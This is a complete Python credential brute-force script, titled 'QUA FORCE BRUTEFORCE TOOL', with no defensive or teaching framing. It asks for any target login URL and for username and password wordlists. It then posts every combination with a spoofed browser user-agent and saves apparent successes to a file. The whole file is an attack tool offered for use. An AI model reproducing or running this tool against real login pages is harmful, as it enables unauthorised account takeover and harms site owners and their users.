import requests
import time
from colorama import Fore, init
import os

init(autoreset=True)

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Fore.RED}
   ____  _    _         ______ ____  _____   _____ ______
  / __ \| |  | |  /\   |  ____/ __ \|  __ \ / ____|  ____|
 | |  | | |  | | /  \  | |__ | |  | | |__) | |    | |__
 | |  | | |  | |/ /\ \ |  __|| |  | |  _  /| |    |  __|
 | |__| | |__| / ____ \| |   | |__| | | \ \| |____| |____
  \___\_\\____/_/    \_\_|    \____/|_|  \_\\_____|______|
{Fore.RESET}
{Fore.WHITE}QUA FORCE BRUTEFORCE TOOL
{Fore.RESET}                                                                                                                        """
    print(banner)

def brute_force(url, username_list, password_list, delay=1):
    for username in username_list:
        username = username.strip()
        for password in password_list:
            password = password.strip()

            session = requests.Session()

            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Referer': url,
                }

                data = {
                    'username': username,
                    'password': password,
                    'login': 'Login'
                }

                response = session.post(url, headers=headers, data=data, timeout=10)

                if "login failed" not in response.text.lower() and response.status_code == 200:
                    print(f"{Fore.GREEN}[+] SUCCESS! Username: {username} Password: {password}{Fore.RESET}")
                    with open("success.txt", "a") as f:
                        f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
                    return
                else:
                    print(f"{Fore.RED}[-] Failed: {username}:{password}{Fore.RESET}")

                time.sleep(delay)  # rate limiting

            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error: {e}{Fore.RESET}")
                continue

def main():
    print_banner()

    url = input(f"{Fore.CYAN}[?] Enter target URL (e.g., http://example.com/login.php): {Fore.RESET}")
    username_file = input(f"{Fore.CYAN}[?] Enter username file path: {Fore.RESET}")
    password_file = input(f"{Fore.CYAN}[?] Enter password file path: {Fore.RESET}")

    try:
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
            usernames = f.readlines()

        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.readlines()

        print(f"{Fore.BLUE}[*] Starting brute force attack...{Fore.RESET}")
        print(f"{Fore.BLUE}[*] Usernames loaded: {len(usernames)}{Fore.RESET}")
        print(f"{Fore.BLUE}[*] Passwords loaded: {len(passwords)}{Fore.RESET}")

        brute_force(url, usernames, passwords)

    except FileNotFoundError:
        print(f"{Fore.RED}[!] File not found!{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")

if __name__ == "__main__":
    main()
